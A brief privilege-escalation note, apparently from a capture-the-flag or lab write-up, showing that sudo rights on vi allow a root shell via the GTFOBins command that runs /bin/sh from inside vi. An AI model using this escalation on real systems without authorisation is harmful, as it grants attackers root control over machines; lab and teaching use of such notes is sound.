`sudo -l` tells us we can run `vi` as root

[gtfobins](https://gtfobins.github.io/gtfobins/vi/) tells us we can run the following command to get a shell as root through vi:

`vi -c ':!/bin/sh' /dev/null`
